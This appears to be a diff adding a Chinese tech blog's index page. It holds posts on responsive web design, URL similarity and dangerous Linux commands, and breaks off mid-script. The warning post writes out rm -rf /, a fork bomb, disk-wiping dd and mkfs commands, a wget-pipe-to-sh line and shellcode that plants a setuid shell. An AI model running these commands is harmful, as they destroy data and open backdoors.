@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://www.veitor.net').hostname,
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="keywords" content="php,CQRS,DDD,Event Sourcing,linux,Yii,kubernetes,golang,docker,互联网,化龙巷,常州">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Veitor的技术点滴">
+<meta property="og:url" content="http:&#x2F;&#x2F;www.veitor.net&#x2F;page&#x2F;7&#x2F;index.html">
+<meta property="og:site_name" content="Veitor的技术点滴">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://www.veitor.net/page/7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: true,
+    isPost: false,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Veitor的技术点滴</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veitor的技术点滴</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">PHP,DDD,CQRS,Event Sourcing,Kubernetes,Docker,Golang</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/responsive-and-adaptive/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/responsive-and-adaptive/" class="post-title-link" itemprop="url">两个宜于『统一Web』的方案：响应式与自适应</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-07-30 05:39:14" itemprop="dateCreated datePublished" datetime="2014-07-30T05:39:14+08:00">2014-07-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JS/" itemprop="url" rel="index">
+                    <span itemprop="name">JS</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><a href="http://storage.veitor.net/uploads/2014/07/1377683186626.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/1377683186626.jpg" alt="1377683186626"></a>你大概早就听别人说过我们正处在『后PC时代』。那么它对于Web开发者来说意味着什么呢？它意味着你那网站的30%到50%的流量如今已经来自移动设备。意味着很快，使用台式机和笔记本访问Web的人将逐渐减少。 （那么）我们该如何在用户行为上处理这种结构性转变？我们已经逾越了用M-dot或T-dot来hack的阶段，开始步入一个由响应式与自适应设计 技术统治的时代——即W3C联盟口中的统一化Web来临。W3C议案的关键部分在于『统一化Web意味着，在合理条件下，无论用户使用什么设备，要将相同 的信息与服务传达给他们。』 对于开发者来说，那就意味着统一化Web方案要确保你的站点不仅工作在今天的智能手机和平板电脑上，也要能应付未来那遥未可知的屏幕画面。 目前有三种流行性方案来开发网站：使用<a href="http://www.webmonkey.com/2013/01/take-responsive-design-beyond-media-queries/" target="_blank" rel="noopener">响应式设计</a>、 客户端自适应、服务器端自适应。 这三种方案难分高下，每种都有其自身的优缺点。明智的Web开发者会在实施下一个项目之前权衡各自的利弊。</p>
+<h2 id="响应式Web设计"><a href="#响应式Web设计" class="headerlink" title="响应式Web设计"></a>响应式Web设计</h2><p>响应式Web设计是最常见的统一化Web方案。它使用<a href="http://www.webmonkey.com/2012/01/building-a-responsive-future-friendly-web-for-everyone/" target="_blank" rel="noopener">CSS Media Queries</a>根据设备显示器的规格来调整网站的呈现方式。从<a href="http://www.webmonkey.com/2011/09/the-boston-globe-embraces-responsive-design/" target="_blank" rel="noopener">波士顿环球报</a>到迪斯尼站点到Indochino西服网站，响应式站点的数量正在飞速增长。 这种方案的核心优势在于设计者可以为所有设备使用同一模板，仅用CSS来定制不同大小屏幕上内容的呈现方式即可。 然而，一个良好的响应式设计没什么捷径可言。要迈向响应式，团队通常需要进行完全的站点重建。 在设计和测试阶段会非常繁琐，保证为每种可能的设备或内容定制用户体验很困难。我们都见过那样一堆看起来一点儿都不吻合的碎片拼图站点。在移动用户优先考虑的开发过程中，响应式站点设计可以与设备结合得很融洽。对于平板和手提电脑来说，（响应式设计）则<a href="http://www.webmonkey.com/2012/03/video-progressive-enhancement-2-0/" target="_blank" rel="noopener">更有优势</a>。 对响应式站点来说，性能也很可怕。在Mobify公司，我们近期完成了一项对15个流行的响应式电子商务站点的分析。在这些站点中，主页平均加载87个资源、1.9MB的数据量。一些响应式页面可以大到15MB。 之所以数据量这么大是因为响应式方案需考虑到所有设备。你的用户只使用一种设备，但是不得不在使用前等待所有的页面元素和资源加载才行。简单来说，性能影响你的底线。在智能手机端，当用户不得不等上一秒时，转化率会<a href="http://www.webperformancetoday.com/2011/11/23/case-study-slow-page-load-mobile-business-metrics/" target="_blank" rel="noopener">额外降低3.5%</a>。若是达到3秒大关，<a href="http://www.strangeloopnetworks.com/resources/infographics/web-performance-and-user-expectations/website-abandonment-happens-after-3-seconds/" target="_blank" rel="noopener">57%的用户</a>会彻底离开你的站点。 当响应式设计迅速成为普遍的标准时，也为在线电商带来了新的挑战，包括怎样处理图片、怎样优化移动端性能，并且当采用移动优先的方案时，通常意味着网站必须推倒重建。</p>
+<h2 id="客户端自适应"><a href="#客户端自适应" class="headerlink" title="客户端自适应"></a>客户端自适应</h2><p>客户端自适应秉承着『为定制的设备 内容传达响应式设计用户体验』的原则。它采用JavaScript丰富站点的功能和独特性。比如，自适应站点只为Retina显示器（比如新款iPad）提供Retina质量的图片，而标准精度显示器接收低质量图片。 自适应设计有两种方案：一种是在客户端生效，在用户的浏览器上；另一种是由Web服务器负荷来检测设备类型并加载正确模板。客户端自适应类型的网站 案例包括个性T恤Threadless和奢侈品闪购ideeli。自适应模板方案的优势在于其复用HTML和JavaScript的能力，简化了项目管理 和测试的更迭。 客户端响应方案意味着你不必完全重构网站。相反你可以基于已有内容布局移动响应。对于专家级开发者而言，这种方案也可以让你针对指定设备或屏幕分辨 率。例如，对Mobify的大多在线时尚零售客户而言，95%的移动端流量来自iPhone。客户端自适应意味着他们可以专门针对苹果智能手机进行优化。 与响应式设计不同，自适应模板确保客户端设备只加载所需资源。因为对设备和特性的检测已经转移到了移动设备自身，类似Akamai和Edgecast的内容分发网络可以在不影响用户体验的情况下使用他们大部分的缓存功能。 客户端自适应比起响应式设计而言有着更高的壁垒。开发者用这项技术需要熟练掌握JavaScript，也依托于网站现有的模板为基础。最后，因为客户端自适应作为现有底层代码上的覆盖物，你需要在网站迁移时让它们作为一个整体。</p>
+<h2 id="服务器端自适应"><a href="#服务器端自适应" class="headerlink" title="服务器端自适应"></a>服务器端自适应</h2><p>依赖于服务器插件和自定义用户代理检测器我们也可以通过多种途径得到服务器端自适应方案。使用服务器端自适应的网站包括Etsy，One Kings Lane和OnlineShoes.com。 为什么要选择服务器端自适应？它通常针对每个设备提供独特的模板，允许更多的定制。并且这种方案把设备检测逻辑块放在服务器上，使得小型移动页面加载得更快。除此之外，对于像Magneto这种常见的CMS和电子商务系统来说，还有多种多样可用的服务器端插件。 这种方案不适用于小心脏——通常需要你大幅度改变后端系统，实施起来将会是冗长（和昂贵）的。管理多种模板需要有持续不断的维护成本。最后，当服务 器过载时这种方案还会带来性能问题。当服务器上加载移动用户代理检测器的时候，需要关掉许多部署在CDN上的缓存机制，像Akamai一样，这将导致移动 端和桌面访客的用户体验速率降低。 当然，许多公司仍然在跟响应的基本要领角力，显然还没有准备好面对重口味的自适应。然而，随着竞争的加剧和移动通信流量的上涨，越来越多的团队将在所有三个方法上浅尝辄止，（最终）择出一个最适合他们用户的方案。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/10-most-dangerous-commands-to-never-execute-in-Linux/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/10-most-dangerous-commands-to-never-execute-in-Linux/" class="post-title-link" itemprop="url">永远不要在 Linux 执行的 10 个最危险的命令</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-07-17 02:49:25" itemprop="dateCreated datePublished" datetime="2014-07-17T02:49:25+08:00">2014-07-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index">
+                    <span itemprop="name">计算机系统</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正 在做什么时候。这篇文章并不打算引来你对Linux或linux 命令行的愤怒。我们只是想让你意识到在你运行某些命令时应该三思而后行。（译注：当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普 通用户身份下，破坏的只是自己的一亩三分地。） <a href="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg" alt="08063106_Sreu"></a> <strong>1. rm -rf 命令</strong> rm -rf命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。下列是一些rm 命令的选项。</p>
+<ul>
+<li>rm　命令在Linux下通常用来删除文件。</li>
+<li>rm -r 命令递归的删除文件夹，甚至是空的文件夹。（译注：个人认为此处应该是说错了，从常识看，应该是“甚至是非空的文件夹”）</li>
+<li>rm -f 命令能不经过询问直接删除‘只读文件’。（译注：Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数 只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来 要求删除确认，而-f则抑制了这个提示。）</li>
+<li>rm -rf / : 强制删除根目录下所有东东。（就是说删除完毕后，什么也没有了。。。）</li>
+<li>rm -rf *:　强制删除当前目录的所有文件。</li>
+<li>rm -rf . : 强制删除当前文件夹及其子文件夹。</li>
+</ul>
+<p>从 现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好 你在做什么！译者本人有着血泪的教训啊。） <strong>2. :(){:|:&amp;};: 命令</strong> 这就是个fork 炸弹的实例。具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。 :(){:|:&amp;};: 哦？你确认你要试试么？千万别在公司正式的服务器上实验啊~~ <strong>3. 命令　&gt; /dev/sda</strong> 上列命令会将某个‘命令‘的输出写到块设备/dev/sda中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。 <strong>4. mv 文件夹 /dev/null</strong> 这 个命令会移动某个‘文件夹‘到/dev/null。在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。（译注：这就是黑洞啊。当然，要说明的是，通过将文件夹移动到黑洞，并不能阻止 数据恢复软件的救赎，所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成——我知道你肯定有些东西想删除得干干净净的。） # mv /home/user/* /dev/null 上列命令会将User目录所有内容移动到/dev/null，这意味着所有东西都被‘卷入’黑洞　(null)之中。 <strong>5. wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</strong> 上列命令会从一个（也许是）恶意源下载一个脚本并执行。Wget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。 注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。（译注：所以，你真的知道你在做什么吗？当遇到这种需要是，我的做法是，先wget下来，然后我去读一读其中到底写了些什么，然后考虑是否执行。） <strong>6. mkfs.ext3 /dev/sda</strong> 上列命令会格式化块设备‘sda’，你无疑知道在执行上列命令后你的块设备(硬盘驱 动器)会被格式化，崭新的!没有任何数据，直接让你的系统达到不可恢复的阶段。（译注：通常不会直接使用/dev/sda这样的设备，除非是作为raw设 备使用，一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁 灭性的，上面的数据都会被蒸发了。） <strong>7. &gt; file</strong> 上列命令常用来清空文件内容（译注：通常也用于记录命令输出。 不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。另外，我想你可能真正想用的是 “&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。）。如果用上列执行时输入错误或无知的输入类似 “&gt;xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。 <strong>8. ^foo^bar</strong> 这个命令在我们<a href="http://linux.cn/article-2284-1.html" target="_blank" rel="noopener">十个鲜为人知的 Linux 命令 – Part 3</a>中描述过，用来编辑先前运行的命令而无需重打整个命令。但当用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。（译注：事实上，这种小技巧是译者认为的，少数史前时代遗留下来的无用而有害的“黑客”技巧。） <strong>9. dd if=/dev/random of=/dev/sda</strong> 上列命令会向块设备sda写入随机的垃圾文件从而擦出数据。当然！你的系统可能陷入混乱和不可恢复的状态。（译注：记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。） <strong>10. 隐藏命令</strong> 下面的命令其实就是上面第一个命令 (rm -rf)。这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄。在终端里运行下面命令可能会擦除你的根分区。 这个命令表明通常真正的危险是隐藏的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。不要编译／运行从未知来源的代码。</p>
+<p>char esp[] __attribute__ ((section(“.text”))) /* e.s.prelease */= “\xeb\x3e\x5b\x31\xc0<br>\x50\x54\x5a\x83\xec\x64\x68″“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″“<br>\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″“\x56\x04\xf7\x56\x08\xf7\x56<br>\x0c\x83\xc4\x74\x56″“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″“\xc0<br>\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″“\x6e\x2f\x73\x68\x00\x2d\x63<br>\x00″“cp -p /bin/sh /tmp/.beyond; chmod 4755/tmp/.beyond;”;</p>
+<p>注意: 不要在你的或你的同学或学校的电脑里的Linux终端或Shell执行以上的任何一个命令。如果你想测试它们，请在虚拟机上运行。任何不和谐或数据丢失，由于运行上面的命令导致你的系统崩溃，文章作者和Tecmint概不负责。（译注：译者和转载网站也不负责~！）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/URL-similarity-calculation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/URL-similarity-calculation/" class="post-title-link" itemprop="url">URL相似度计算的思考</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-07-17 00:59:35" itemprop="dateCreated datePublished" datetime="2014-07-17T00:59:35+08:00">2014-07-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/" itemprop="url" rel="index">
+                    <span itemprop="name">经验分享</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在做一些web相关的工作的时候，我们往往可能需要做一些对url的处理，其中包括对相似的url的识别和处理。这就需要计算两个url的相似度。 那么怎么进行url相似度的计算的？我首先想到的是把一个url看作是一个字符串，这样就简化成两个字符串相似度的计算。字符串相似度计算有很多已经比较成熟的算法，比如“<a href="http://en.wikipedia.org/wiki/Levenshtein_Distance" target="_blank" rel="noopener">编辑距离算法</a>”，该算法描述了两个字符串之间转换需要的最小的编辑次数；还有一些其他的比如“<a href="http://www.cnblogs.com/dartagnan/archive/2011/10/06/2199764.html" target="_blank" rel="noopener">最长公共字串</a>”等方法。但这些方法对于url相似度的计算来说是不是够了呢？比如给以下三个url： url1: <a href="http://www.spongeliu.com/xxx/123.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/123.html</a> url2: <a href="http://www.spongeliu.com/xxx/456.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/456.html</a> url3: <a href="http://www.spongeliu.com/xxx/abc.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/abc.html</a> 这三个url的编辑距离是一致的，但是直观上我们却认为url1和url2更加相似一些。 再比如我们要判断两个站点是否同一套建站模版建立的，抽出两个url如下这样： url1: <a href="http://www.163.com/go/artical/43432.html" target="_blank" rel="noopener">www.163.com/go/artical/43432.html</a> url2: <a href="http://www.sina.com.cn/go/artical/453109.html" target="_blank" rel="noopener">www.sina.com.cn/go/artical/453109.html</a> 这两个url按照情景应该是相似的，这就超出了字符串相似度判断的能力范围。 </p>
+<p>重新回到问题，要判断的是两个url的相似度，但是字符串的判断方法又不能很好应用。那么url和字符串的区别在哪里？这取决于如何定义相似的url。可以注意到，url比字符串含有更多的信息可以参考，因为url本身是包含<strong>结构和特征</strong>的，比如站点、目录。定义相似url的时候，是否要考虑站点？是否要考虑目录的一致？是否要考虑目录的深度？这取决于具体的需求。 考虑到url本身的结构，对其相似度的计算就可以抽象为对其关键特征相似度的计算。比如可以把站点抽象为一维特征，目录深度抽象为一维特征，一级目录、二级目录、尾部页面的名字也都可以抽象为一维特征。比如下面两个url: url1:  <a href="http://www.spongeliu.com/go/happy/1234.html" target="_blank" rel="noopener">http://www.spongeliu.com/go/happy/1234.html</a> url2:  <a href="http://www.spongeliu.com/snoopy/tree/abcd.html" target="_blank" rel="noopener">http://www.spongeliu.com/snoopy/tree/abcd.html</a> 先不定义他们是否相似，先来抽象一下他们的特征： </p>
+<p>1、站点特征：如果两个url站点一样，则特征取值1，否则取值0； </p>
+<p>2、目录深度特征：特征取值分别是两个url的目录深度是否一致； </p>
+<p>3、一级目录特征：在这维特征的取值上，可以采用多种方法，比如如果一级目录名字相同则特征取1，否则取0；或者根据目录名字的编辑距离算出一个特征值； 或者根据目录名字的pattern，如是否数字、是否字母、是否字母数字穿插等。这取决于具体需求，这里示例仅仅根据目录名是否相同取1和0； </p>
+<p>4、尾页面特征：这维特征的取值同一级目录，可以判断后缀是否相同、是否数字页、是否机器生成的随机字符串或者根据编辑长度来取值，具体也依赖于需求。这里示例仅仅判断最后一级目录的特征是否一致（比如是否都由数字组成、是否都有字母组成等）。 这样，对于这两个url就获得了4个维度的特征，分别是：1 1 0 0 。 有了这两个特征组合，就可以根据具体需求判断是否相似了。我们定义一下每个特征的重要程度，给出一个公式： similarity = feather1 * x1 + feather2*x2 + feather3*x3 + feather4*x4; 其 中x表示对应特征的重要程度，比如我认为站点和目录都不重要，最后尾页面的特征才是最重要的，那么x1,x2,x3都可以取值为0，x4取值为 1，这样根据similarity就能得出是否相似了。或者认为站点的重要性占10%，目录深度占50%，尾页面的特征占40%，那么系数分别取值为 0.1\0.5\0\0.4即可。 其实这样找出需要的特征，可以把这个问题简化成一个机器学习的问题，只需要人为判断出一批url是否相似，用svm训练一下就可以达到机器判断的目的。 除了上面这种两个url相似度的判断，也可以将每一条url都抽象成一组特征，然后计算出一个url的得分，设置一个分数差的阈值，就可以达到从一大堆url中找出相似的url的目的。   下面的代码是perl编写的抽象两个url特征的脚本，这只是一个测试的脚本，难免有bug和丑陋的地方，仅供参考：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">my</span> $url1 = $ARGV\[<span class="number">0</span>\];</span><br><span class="line"><span class="keyword">my</span> $url2 = $ARGV\[<span class="number">1</span>\];</span><br><span class="line"><span class="keyword">my</span> @array1 = <span class="keyword">split</span>( <span class="regexp">/\\/</span><span class="regexp">/, $url1 );</span></span><br><span class="line"><span class="regexp">my @array2 = split( /</span>\\//, $url2 );</span><br><span class="line"><span class="comment">#特征1：目录数</span></span><br><span class="line"><span class="keyword">my</span> $path1 = @array1;</span><br><span class="line"><span class="keyword">my</span> $path2 = @array2;</span><br><span class="line"><span class="comment">#print $path1, $path2;</span></span><br><span class="line"><span class="comment">#特征2：是否目录结尾</span></span><br><span class="line"><span class="keyword">my</span> $lastispath1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> $lastispath2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( $url1 =~ <span class="regexp">/\\/</span>$/ )</span><br><span class="line">&#123;</span><br><span class="line">	$lastispath1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $url1 =~ <span class="regexp">/\\/</span>$/ )</span><br><span class="line">&#123;</span><br><span class="line">	$lastispath2 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>#特征3：最后一级是否有后缀(htm,html,shtml等)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 